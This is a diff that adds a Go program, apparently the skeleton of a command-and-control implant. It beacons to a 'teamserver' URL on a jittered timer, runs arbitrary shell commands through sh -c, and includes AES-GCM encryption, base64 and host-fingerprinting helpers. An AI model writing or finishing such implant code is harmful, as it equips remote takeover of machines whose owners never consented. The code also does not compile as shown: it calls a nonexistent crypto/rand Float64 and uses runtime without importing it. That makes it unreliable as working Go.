@@ -1,0 +1,103 @@
+package main
+
+import (
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"encoding/base64"
+	"fmt"
+	"io"
+	"net/http"
+	"os"
+	"os/exec"
+	"time"
+)
+
+const (
+	sleepTime  = 10
+	jitter     = 0.1
+	serverURL  = "http://teamserver:8443"
+	profile    = ""
+	encryption = ""
+	version    = "1.0.0"
+	buildTime  = "2026-09-16T07:58:51Z"
+)
+
+func main() {
+	for {
+		time.Sleep(time.Duration(sleepTime) * time.Second)
+		jitterDuration := time.Duration(float64(time.Second) * jitter * (rand.Float64()*2 - 1))
+		time.Sleep(jitterDuration)
+		checkIn()
+	}
+}
+
+func checkIn() {
+	resp, err := http.Get(serverURL + "/api/v1/health")
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+}
+
+func executeCommand(cmd string) (string, error) {
+	out, err := exec.Command("sh", "-c", cmd).Output()
+	if err != nil {
+		return "", err
+	}
+	return string(out), nil
+}
+
+func encrypt(data []byte, key []byte) ([]byte, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
+		return nil, err
+	}
+	return gcm.Seal(nonce, nonce, data, nil), nil
+}
+
+func decrypt(data []byte, key []byte) ([]byte, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	nonceSize := gcm.NonceSize()
+	if len(data) < nonceSize {
+		return nil, fmt.Errorf("ciphertext too short")
+	}
+	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
+	return gcm.Open(nil, nonce, ciphertext, nil)
+}
+
+func encodeBase64(data []byte) string {
+	return base64.StdEncoding.EncodeToString(data)
+}
+
+func decodeBase64(data string) ([]byte, error) {
+	return base64.StdEncoding.DecodeString(data)
+}
+
+func getHostname() string {
+	hostname, _ := os.Hostname()
+	return hostname
+}
+
+func getOS() string {
+	return runtime.GOOS
+}
+
+func getArch() string {
+	return runtime.GOARCH
+}
